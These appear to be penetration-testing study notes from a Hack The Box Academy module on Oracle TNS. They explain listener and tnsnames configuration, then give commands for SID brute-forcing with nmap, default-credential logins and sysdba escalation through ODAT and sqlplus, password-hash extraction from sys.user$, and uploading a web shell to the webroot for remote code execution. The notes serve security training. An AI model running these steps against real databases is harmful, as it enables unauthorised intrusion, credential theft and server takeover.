# Oracle TNS - [LINK](https://academy.hackthebox.com/app/module/112/section/2117)


Oracle Transparent Network Substrate (TNS) is a proprietary communication protocol that facilitates secure, encrypted communication between Oracle databases and applications, typically listening on **TCP port 1521**.

## Default Configuration & Key Files

Oracle TNS relies on configuration files traditionally located in the `$ORACLE_HOME/network/admin` directory.

* **`listener.ora` (Server-Side):** Defines the listener process properties, network interfaces, protocols, and the services it routes. It determines how the server receives and forwards incoming client requests.
* **`tnsnames.ora` (Client-Side):** Resolves service names to network addresses. It provides clients with the necessary connection attributes (IP, port, SID, service name).
* **`PlsqlExclusionList` (Blacklist):** A user-created text file placed in `$ORACLE_HOME/sqldeveloper` that lists PL/SQL packages or types excluded from execution to protect the database instance.

**Core TNS Connection Settings**

| Setting | Description |
| --- | --- |
| **DESCRIPTION** | A descriptor that provides a name for the database and its connection type. |
| **ADDRESS** | The network address of the database (hostname and port). |
| **PROTOCOL** | The network protocol used for communication (e.g., TCP, UDP, IPC). |
| **PORT** | The port number used for communication (default: 1521). |
| **CONNECT_DATA** | Specifies attributes of the connection, such as the service name, SID, and instance identifier. |
| **INSTANCE_NAME** | The name of the specific database instance the client wants to connect to. |
| **SERVICE_NAME** | The name of the service the client wants to connect to. |
| **SERVER** | The type of server used for the database connection (dedicated or shared). |
| **USER / PASSWORD** | Credentials used to authenticate with the database server. |
| **SECURITY** | The type of security for the connection (e.g., SSL/TLS validation). |
| **CONNECT_TIMEOUT** | The time limit (in seconds) for the client to establish a connection. |
| **RECEIVE_TIMEOUT / SEND_TIMEOUT** | The time limit to receive a response or send a request to the database. |
| **SQLNET.EXPIRE_TIME** | The time limit for the client to detect a connection has failed. |
| **TRACE_LEVEL / LOG_FILE** | Settings defining the tracing level, directory, and log files for connection troubleshooting. |

## Enumeration & SID Brute-Forcing

A System Identifier (SID) is strictly required to connect to a specific database instance. If the wrong SID is provided, the connection fails.

**Nmap Port Scan:**

```bash
sudo nmap -p1521 -sV <TARGET_IP> --open

```

**Nmap SID Brute-Forcing:**

```bash
sudo nmap -p1521 -sV <TARGET_IP> --open --script oracle-sid-brute

```

*Note: Common default SIDs include `XE`, `ORCL`, `PROD`, and `TEST`.*

## Exploitation Tooling

**1. Oracle Database Attacking Tool (ODAT)**
ODAT is an open-source Python penetration testing tool used to enumerate SIDs, brute-force credentials, and exploit Oracle databases (e.g., remote code execution, file uploads).

```bash
# Run all enumeration modules against the target
./odat.py all -s <TARGET_IP>

```

*ODAT output will reveal valid SIDs and brute-forced default credentials (e.g., `scott/tiger`, `sys/change_on_install`).*

**2. SQLplus**
Oracle's traditional command-line interface for interacting with the database once credentials are known.

```bash
# Basic Login Syntax
sqlplus <username>/<password>@<TARGET_IP>/<SID>

# Example: Logging in with discovered credentials
sqlplus scott/tiger@10.129.204.235/XE

# Example: Attempting privilege escalation to System Database Admin
sqlplus scott/tiger@10.129.204.235/XE as sysdba

```

## Database Interaction & Post-Exploitation

Once logged into SQLplus, use standard SQL queries to map privileges, extract password hashes, or execute files.

**Enumeration Queries:**

* `select table_name from all_tables;` (List available tables)
* `select * from user_role_privs;` (Check current user privileges)

**Extracting Password Hashes (Requires DBA/SYSDBA privileges):**

```sql
select name, password from sys.user$;

```

*Hashes can then be taken offline for cracking.*

**File Upload via ODAT:**
If the Oracle server is co-hosted with a web server, use ODAT's `utlfile` module to upload a web shell directly to the webroot.

* **Default Windows Webroot:** `C:\inetpub\wwwroot`
* **Default Linux Webroot:** `/var/www/html`

```bash
# Create a test file
echo "Oracle File Upload Test" > testing.txt

# Upload via ODAT utlfile module
./odat.py utlfile -s <TARGET_IP> -d <SID> -U <USERNAME> -P <PASSWORD> --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt

```

*Verify the upload using:*

```bash
curl -X GET http://<TARGET_IP>/testing.txt

```

*(If successful, the server will return the "Oracle File Upload Test" string. Once write-access to the webroot is confirmed, you can repeat the exact same ODAT `utlfile` process to upload a `.aspx` or `.php` web shell, granting you remote code execution on the underlying operating system).*
